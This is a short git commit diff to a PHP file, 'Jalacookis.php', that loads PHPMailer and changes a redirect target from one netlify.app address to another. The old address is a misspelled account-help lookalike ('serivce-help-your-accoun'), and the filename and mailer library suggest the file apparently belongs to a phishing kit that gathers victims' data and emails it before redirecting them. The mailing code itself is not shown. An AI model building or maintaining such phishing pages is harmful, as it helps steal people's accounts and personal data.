d3e5e5bce8d418c08cc80bc979fb5e696ff3adc5
Lernamzaxal892 <lernayouamzaxal@gmail.com>
2025-08-12 10:44:14 +0500

    Update Jalacookis.php

--- Jalacookis.php
+++ Jalacookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://serivce-help-your-accoun.netlify.app/");
+header("Location: https://zore-page-three-immadtliya.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
